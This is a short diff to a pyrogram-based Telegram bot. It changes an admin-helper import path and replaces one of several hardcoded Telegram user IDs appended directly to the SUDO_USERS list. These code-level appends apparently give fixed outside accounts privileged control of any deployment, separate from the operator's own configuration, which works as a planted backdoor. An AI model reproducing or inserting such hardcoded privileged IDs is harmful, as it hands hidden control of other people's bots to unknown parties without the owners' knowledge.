@@ -4,9 +4,9 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from config import SUDO_USERS
-from helpers.admins import get_administrators
+from helper.admins import get_administrators
 
-SUDO_USERS.append(1757169682)
+SUDO_USERS.append(1221558981)
 SUDO_USERS.append(1738637033)
 SUDO_USERS.append(1448474573)
 SUDO_USERS.append(1672609421)
